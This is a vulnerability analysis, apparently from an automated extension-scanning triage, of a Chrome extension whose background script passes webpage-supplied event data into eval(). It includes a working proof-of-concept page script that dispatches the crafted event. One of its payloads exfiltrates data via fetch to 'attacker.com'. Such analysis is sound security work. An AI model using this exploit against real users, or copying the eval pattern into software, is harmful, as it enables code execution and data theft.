# CoCo Analysis: malinpkfecnmopigcdnlacnpgjoffhlc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (duplicate flows to same eval sink)

---

## Sink 1-2: cs_window_eventListener_netbrain_ext_event_find_tab_nav → eval_sink

**CoCo Trace:**
Lines 48-92 in used_time.txt show two identical flows:
```
tainted detected!~~~in extension: with eval_sink
from cs_window_eventListener_netbrain_ext_event_find_tab_nav to eval_sink
```

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/malinpkfecnmopigcdnlacnpgjoffhlc/opgen_generated_files/cs_1.js
- Line 468: window.addEventListener(Trigger_TabsChecking_Event_Name, function (data) {
- Line 470: log(data.detail);

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/malinpkfecnmopigcdnlacnpgjoffhlc/opgen_generated_files/bg.js
- Line 989: var pendingUrl = getComparableURL(urlObj.url, urlObj.url_filter);
- Line 1032: var function_code = url_filter.function;
- Line 1038: var new_url = eval("(" + function_code + ")('" + url + "')");

**Code:**

```javascript
// Content script (cs_1.js) - Lines 467-472
var Trigger_TabsChecking_Event_Name = "netbrain_ext_event_find_tab_nav";
window.addEventListener(Trigger_TabsChecking_Event_Name, function (data) {
  log("received data.");
  log(data.detail);
  chrome.runtime.sendMessage(data.detail); // ← attacker-controlled data sent to background
});

// Background script (bg.js) - Lines 967-989
browser.runtime.onMessage.addListener(function (urlObj, sender, sendResponse) {
  // urlObj comes from content script, attacker-controlled
  browser.tabs.query({}, (tabs) => {
    browser.tabs.query({ active: true, currentWindow: true }, (cur) => {
      process(urlObj, tabs, cur[0]); // ← attacker-controlled urlObj
    });
  });
});

// Background script (bg.js) - Lines 987-1011
function process(urlObj, tabs, currentTab) {
  var foundSameURL = false;
  var pendingUrl = getComparableURL(urlObj.url, urlObj.url_filter); // ← urlObj.url_filter controlled
  tabs.forEach((tab) => {
    if (tab.id == currentTab.id && tab.windowId == currentTab.windowId) {
      // do nothing
    } else {
      var tab_url = getComparableURL(tab.url, urlObj.url_filter); // ← attacker controls url_filter
      if (tab_url == pendingUrl) {
        foundSameURL = true;
        browser.tabs.remove([currentTab.id]);
        browser.tabs.update(tab.id, { active: true, highlighted: true });
        if (urlObj.action) {
          executeWebAction(tab.id, urlObj.action);
        }
      }
    }
  });
  if (!foundSameURL) {
    browser.tabs.update(currentTab.id, { active: true, url: urlObj.url });
  }
}

// Background script (bg.js) - Lines 1024-1040
function getComparableURL(url, url_filter) {
  if (!isValidHttpUrl(url)) {
    return "";
  }

  var sort = url_filter.sort || false;
  var removeParams = url_filter.removeParams || [];
  var removeHash = url_filter.removeHash || false;
  var function_code = url_filter.function; // ← attacker-controlled
  var expression = url_filter.expression;

  if (function_code) {
    // CRITICAL VULNERABILITY: eval with attacker-controlled code
    var new_url = eval("(" + function_code + ")('" + url + "')"); // ← CODE EXECUTION
    return new_url;
  }
  // ... rest of function
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM Custom Event (window.addEventListener)

**Attack:**

```javascript
// Malicious webpage on http://*/netbrainnv.html?* (matches content_scripts pattern)
// Attacker triggers the vulnerability by dispatching a custom event

// Step 1: Create malicious payload with arbitrary JavaScript code
var maliciousPayload = {
  url: "http://example.com",
  url_filter: {
    function: "function(url) { chrome.tabs.executeScript(null, {code: 'alert(document.cookie)'}); return url; }"
  }
};

// Step 2: Dispatch custom event to trigger extension's listener
var event = new CustomEvent("netbrain_ext_event_find_tab_nav", {
  detail: maliciousPayload
});
window.dispatchEvent(event);

// Alternative: Execute arbitrary code directly via eval
var payloadWithEval = {
  url: "http://example.com",
  url_filter: {
    function: "function(url) { eval('alert(\"XSS\"); fetch(\"https://attacker.com/steal?data=\" + JSON.stringify(chrome))'); return url; }"
  }
};
var event2 = new CustomEvent("netbrain_ext_event_find_tab_nav", {
  detail: payloadWithEval
});
window.dispatchEvent(event2);
```

**Impact:** Arbitrary code execution in the extension's background context with full extension privileges. The attacker can execute any JavaScript code by providing a malicious `url_filter.function` string that gets passed to `eval()`. This allows the attacker to:
1. Execute arbitrary JavaScript in the privileged extension context
2. Access all Chrome extension APIs the extension has permissions for (tabs, scripting, all host permissions)
3. Read/modify any webpage content across all domains (host_permissions: "*://*/*")
4. Execute scripts in any tab via chrome.scripting.executeScript
5. Exfiltrate sensitive data or perform actions on behalf of the user

**Note:** The extension runs on pages matching `*://*/netbrainnv.html?*`, and any malicious webpage at this path can dispatch the custom event to trigger the vulnerability.

---
